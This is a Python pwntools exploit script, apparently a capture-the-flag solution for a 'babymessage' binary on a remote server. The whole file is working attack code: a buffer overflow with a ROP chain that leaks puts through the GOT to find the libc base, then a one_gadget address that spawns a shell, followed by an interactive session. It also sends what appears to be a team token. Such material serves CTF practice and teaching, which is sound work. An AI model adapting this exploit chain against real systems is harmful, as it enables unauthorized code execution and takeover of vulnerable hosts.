from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

#io=process('./babymessage')
libc=ELF('../libc-2.27.so')
#libc=ELF('./libc-2.23.so')

ELF('./pwn')
io=remote('123.56.170.202',21342)
io.sendline('2')

io.send('aaaaaaaa'+p8(0x60))
puts_got=0x0601020
puts_plt=0x400670
pop_rdi=0x0400ac3 

io.recvuntil('choice:')
io.sendline('2')
io.recvuntil('message:')
pl='a'*0x10+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0x100)+p64(0x040080A)
io.send(pl)
puts_add=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base=puts_add-libc.sym['puts']
print(hex(libc_base))
sys=libc_base+libc.sym['system']
sh=libc_base+libc.search('/bin/sh').next()
print(hex(sh))
io.recvuntil('message:')
pl2='a'*0x10+p64(libc_base+0x4f365)
#p64(pop_rdi)+p64(sh)+p64(sys)
#gdb.attach(io)
io.send(pl2)
io.sendline('icq6ff2e51dc6d3fcddc3b64cb0f135a')

io.interactive()
